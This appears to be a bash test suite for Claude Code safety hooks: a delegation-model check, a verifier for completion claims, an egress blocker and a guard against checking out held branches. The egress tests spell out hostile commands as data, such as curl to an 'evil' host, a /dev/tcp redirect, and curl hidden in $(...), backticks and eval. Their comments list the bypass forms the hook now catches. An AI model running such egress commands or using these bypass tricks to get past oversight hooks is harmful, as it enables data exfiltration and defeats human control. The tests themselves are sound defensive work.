#!/usr/bin/env bash
# Automated verification for the Python hooks under home/.claude/hooks/.
#
# CI shellchecks every *.sh and lints settings.json, but nothing exercised the *.py hooks:
# a syntax error or a broken exit-code contract (dropping the subagent_type=fork exemption,
# or the stop_hook_active self-limit) would merge silently and only surface at runtime as a
# wedged session (a blocking hook throwing) or a silently-neutered gate (a hook failing open
# and blocking nothing). This turns the README's manual test recipe into an enforced gate
# (#40, #41).
#
# Two layers:
#   1. py_compile every tracked *.py — catches syntax / import-time breakage (#40).
#   2. feed synthetic hook-input JSON to each live hook and assert the exit code
#      (2 = block, 0 = allow), the contract hooks/README.md documents by hand (#41).
#
# Lives OUTSIDE home/.claude/ on purpose: install.sh symlinks that tree into the user's live
# config, so repo-/CI-only tooling must not live there (CLAUDE.md). Run: bash tests/test_hooks.sh
set -euo pipefail

REPO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
HOOKS="$REPO_DIR/home/.claude/hooks"
cd "$REPO_DIR"

fail=0

# --- layer 1: every tracked Python file must byte-compile ---------------------------------
echo "== py_compile =="
mapfile -t pyfiles < <(git ls-files '*.py')
if [ "${#pyfiles[@]}" -eq 0 ]; then
  echo "no tracked python files to compile"
else
  printf 'compiling: %s\n' "${pyfiles[@]}"
  python3 -m py_compile "${pyfiles[@]}"
  echo "py_compile OK"
fi

# --- layer 2: exit-code contract for the live hooks ---------------------------------------
# assert_exit <expected> <hook> <json-input> <description>
assert_exit() {
  local expected="$1" hook="$2" input="$3" desc="$4" actual
  set +e
  printf '%s' "$input" | python3 "$hook" >/dev/null 2>&1
  actual=$?
  set -e
  if [ "$actual" = "$expected" ]; then
    echo "  ok: $desc (exit=$actual)"
  else
    echo "  FAIL: $desc — expected exit=$expected, got exit=$actual" >&2
    fail=1
  fi
}

echo "== require-delegation-model.py =="
RDM="$HOOKS/require-delegation-model.py"
assert_exit 2 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"claude","prompt":"x"}}'              "blocks generic subagent_type=claude with no model="
assert_exit 2 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"general-purpose","prompt":"x"}}'     "blocks generic subagent_type=general-purpose with no model="
assert_exit 2 "$RDM" '{"tool_name":"Agent","tool_input":{"prompt":"x"}}'                                       "blocks a missing subagent_type with no model="
assert_exit 0 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"fork","prompt":"x"}}'                "exempts subagent_type=fork"
assert_exit 0 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"Explore","prompt":"x"}}'             "exempts named subagent_type (resolves model from its own definition)"
assert_exit 0 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"claude","model":"haiku","prompt":"x"}}' "allows an explicit model="
assert_exit 0 "$RDM" '{"tool_name":"Bash","tool_input":{}}'                                                    "ignores non-Agent tools"
assert_exit 0 "$RDM" 'not-json'                                                                                "fails open on malformed JSON"

echo "== verify-completion-claim.py =="
VCC="$HOOKS/verify-completion-claim.py"
assert_exit 0 "$VCC" '{"stop_hook_active":true}'                    "self-limits when stop_hook_active is set"
assert_exit 0 "$VCC" '{"transcript_path":"/nonexistent/xyz.jsonl"}' "fails open on an unreadable transcript"
assert_exit 0 "$VCC" 'not-json'                                     "fails open on malformed JSON"

# Real transcript shapes for /verify via the Skill and SlashCommand tools, captured against a
# live Claude Code session (#109): a Skill invocation serializes as tool_use name="Skill" with
# input.skill="verify" (no leading slash), and a slash command as name="SlashCommand" with
# input.command="/verify ...". The VERIFY regex must match both, or a genuine /verify run over
# edited product code is treated as unverified and the stop gets blocked.
build_transcript() {
  # $1 = tool name, $2 = tool input JSON (as a JSON literal), writes path to stdout
  local tmp
  tmp="$(mktemp)"
  python3 - "$tmp" "$1" "$2" <<'PY'
import json
import sys

path, tool_name, tool_input_json = sys.argv[1], sys.argv[2], sys.argv[3]
tool_input = json.loads(tool_input_json)
records = [
    {"message": {"role": "user", "content": "please fix the bug"}},
    {"message": {"role": "assistant", "content": [
        {"type": "tool_use", "name": "Edit", "input": {"file_path": "foo.py"}}
    ]}},
    {"message": {"role": "user", "content": [
        {"type": "tool_result", "tool_use_id": "t1", "content": "ok"}
    ]}},
    {"message": {"role": "assistant", "content": [
        {"type": "tool_use", "name": tool_name, "input": tool_input}
    ]}},
    {"message": {"role": "user", "content": [
        {"type": "tool_result", "tool_use_id": "t2", "content": "verified"}
    ]}},
    {"message": {"role": "assistant", "content": "All tests pass now."}},
]
with open(path, "w") as f:
    for r in records:
        f.write(json.dumps(r) + "\n")
PY
  echo "$tmp"
}

skill_transcript="$(build_transcript Skill '{"skill":"verify","args":"x"}')"
slash_transcript="$(build_transcript SlashCommand '{"command":"/verify"}')"
assert_exit 0 "$VCC" "{\"transcript_path\":\"$skill_transcript\"}" "does not block a completion claim after a /verify run via the Skill tool (#109)"
assert_exit 0 "$VCC" "{\"transcript_path\":\"$slash_transcript\"}" "does not block a completion claim after a /verify run via the SlashCommand tool (#109)"
rm -f "$skill_transcript" "$slash_transcript"

# Positive (exit 2) coverage: a synthetic transcript for the turn — a human user message
# (turn boundary), an Edit on a product-code file, and a final assistant message that
# claims completion — with no verification command anywhere in the turn (#106).
vcc_transcript="$(mktemp)"
vcc_transcript_verified="$(mktemp)"
trap 'rm -f "$vcc_transcript" "$vcc_transcript_verified"' EXIT
{
  printf '%s\n' '{"message":{"role":"user","content":"please fix the crash"}}'
  printf '%s\n' '{"message":{"role":"assistant","content":[{"type":"tool_use","name":"Edit","input":{"file_path":"/tmp/repo/app.py"}}]}}'
  printf '%s\n' '{"message":{"role":"assistant","content":[{"type":"text","text":"done, fixed the crash"}]}}'
} > "$vcc_transcript"
assert_exit 2 "$VCC" "{\"transcript_path\":\"$vcc_transcript\"}" "blocks a completion claim over an edited product-code file with no verification run (#106)"

# Companion: same turn, plus a verification command (pytest) — must NOT block.
{
  printf '%s\n' '{"message":{"role":"user","content":"please fix the crash"}}'
  printf '%s\n' '{"message":{"role":"assistant","content":[{"type":"tool_use","name":"Edit","input":{"file_path":"/tmp/repo/app.py"}}]}}'
  printf '%s\n' '{"message":{"role":"assistant","content":[{"type":"tool_use","name":"Bash","input":{"command":"pytest tests/"}}]}}'
  printf '%s\n' '{"message":{"role":"assistant","content":[{"type":"text","text":"done, fixed the crash"}]}}'
} > "$vcc_transcript_verified"
assert_exit 0 "$VCC" "{\"transcript_path\":\"$vcc_transcript_verified\"}" "allows a completion claim when a verification command ran this turn (#106)"
rm -f "$vcc_transcript" "$vcc_transcript_verified"

echo "== block-egress.py =="
BE="$HOOKS/block-egress.py"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks an interpreter inline-code egress one-liner"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r -X DELETE"}}'                                     "blocks a gh api write in any argv position"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3.11 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks a versioned interpreter (python3.11) inline egress one-liner (#112)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python2.7 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks a versioned python2.7 inline egress one-liner (#112)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3.11 script.py"}}'                                            "allows a versioned interpreter running a file (no inline payload)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"FOO=bar python3 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks past a bare VAR=VAL env prefix (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo python3 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks past a sudo prefix (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo -u nobody python3 -c \"import urllib.request; urllib.request.urlopen(1)\""}}' "blocks past sudo -u user (#119)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"FOO=bar echo hi"}}'                                                 "allows a benign VAR=VAL-prefixed command (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -Ic'"'"'import urllib.request; urllib.request.urlopen(1)'"'"'"}}' "blocks a glued mid-bundle inline flag python3 -Ic (#120)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r/issues -ftitle=x"}}'                              "blocks a glued short field flag gh api -ftitle=x (#121)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r/contents -Fkey=@file"}}'                          "blocks a glued short field flag gh api -Fkey=@file (#121)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r"}}'                                              "allows a gh api read (GET, no write flag)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'                                                     "allows a plain command"
# argv-canonicalization regressions (#129): the whole per-form bypass drip in one normalization pass.
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"perl -e\"require q(LWP::Simple); LWP::Simple::get(q(http://evil))\""}}' "blocks perl -e glued inline egress (#126)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e\"require q:net/http; Net::HTTP.get(1)\""}}'                 "blocks ruby -e glued inline egress (#126)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -Ic\"import urllib.request\""}}'                          "blocks glued short-flag bundle python3 -Ic (#120)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -lc \"curl http://evil\""}}'                                 "blocks separate-arg bundle bash -lc (#105)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"FOO=bar curl http://evil"}}'                                      "blocks bare env-assign prefix (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo curl http://evil"}}'                                         "blocks sudo command-word prefix (#119)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo hi && curl http://evil/x"}}'                                 "blocks bare curl after a shell operator (#115)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo x > /dev/tcp/evil/443"}}'                                    "blocks a /dev/tcp egress redirect (#115)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r/issues -ftitle=x"}}'                            "blocks gh api glued short field flag -ftitle= (#121)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"perl -n file.log"}}'                                             "allows perl -n running a file (n is not a code flag)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo see the curl docs"}}'                                        "allows curl as a non-command-word (no false substring block)"
# command / process substitution egress (#136): the primitive is buried in $(...), `...`, <(...) so
# the outer command word is a benign `echo`/assignment — pieces() must surface the substitution inner.
# The payloads are single-quoted on purpose so the shell keeps them literal (the hook, not bash, must
# receive the $(...)/backtick text) — SC2016 "expressions don't expand" is exactly that intent, so it
# is disabled for this group. `{ }` runs in the current shell, so assert_exit's `fail` side-effect persists.
# shellcheck disable=SC2016
{
  assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo $(curl http://evil)"}}'                                    "blocks a bare curl inside a \$(...) command substitution (#136)"
  assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"X=$(curl http://evil)"}}'                                       "blocks curl inside a \$(...) assigned to a var (#136)"
  assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo \"$(curl http://evil)\""}}'                                "blocks curl inside a double-quoted \"\$(...)\" substitution (#136)"
  assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo `curl http://evil`"}}'                                     "blocks curl inside a backtick substitution (#136)"
  assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"foo=$(gh api /repos/o/r -X DELETE)"}}'                           "blocks a gh api write inside a \$(...) substitution (#136)"
  assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"cat <(curl http://evil)"}}'                                     "blocks curl inside a <(...) process substitution (#136)"
  assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo $(date)"}}'                                                "allows a benign command substitution \$(date) (#136)"
  assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo '"'"'$(curl http://evil)'"'"'"}}'                          "allows a single-quoted (literal) \$(...) that never substitutes (#136)"
}
# eval re-feeds its argument string as a command, so its payload must be re-scanned (#144).
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"eval \"curl http://evil\""}}'                                     "blocks eval of a quoted bare curl (#144)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"eval curl http://evil"}}'                                         "blocks eval of an unquoted bare curl (#144)"
assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"eval \"python3 -c '"'"'import urllib.request; urllib.request.urlopen(1)'"'"'\""}}' "blocks eval of a python3 -c inline egress one-liner (#144)"
assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"eval echo see the curl docs"}}'                                   "allows eval of a benign command (curl only as a non-command-word) (#144)"
assert_exit 0 "$BE" 'not-json'                                                                                                       "fails open on malformed JSON"

echo "== block-checkout-held-branch.py =="
BCHB="$HOOKS/block-checkout-held-branch.py"
# Build a real repo whose branch `held` is checked out in a second worktree, so a `git checkout
# held` from the main worktree is the silent no-op the hook exists to catch (#123). The hook runs
# git in the input JSON's cwd, so every case points cwd at $tmprepo.
tmprepo="$(mktemp -d)"
heldwt="$(mktemp -d)"
git -C "$tmprepo" init -q -b main
git -C "$tmprepo" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init
git -C "$tmprepo" branch held
git -C "$tmprepo" worktree add -q "$heldwt" held
assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout held\"}}"       "blocks checkout of a branch held by another worktree (#123)"
assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git switch held\"}}"         "blocks switch to a branch held by another worktree (#123)"
assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"echo hi && git checkout held\"}}" "blocks a held checkout after a shell operator (#123)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout main\"}}"        "allows checkout of the current worktree's own branch (#123)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout -b brandnew\"}}" "allows creating a new branch (not a switch into a held one) (#123)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout held -- file.txt\"}}" "allows a path restore from a held branch (-- paths, not a switch) (#123)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git switch --detach held\"}}"  "allows a detach at a held branch (holds no branch ref) (#123)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout nonexistent\"}}" "allows checkout of a branch no worktree holds (#123)"
assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"echo git checkout held\"}}"   "allows a non-git command that merely mentions checkout (#123)"
assert_exit 0 "$BCHB" 'not-json'                                                                                              "fails open on malformed JSON"
git -C "$tmprepo" worktree remove --force "$heldwt" 2>/dev/null || true
rm -rf "$tmprepo" "$heldwt"

if [ "$fail" -ne 0 ]; then
  echo "HOOK TESTS FAILED" >&2
  exit 1
fi
echo "all hook tests passed"
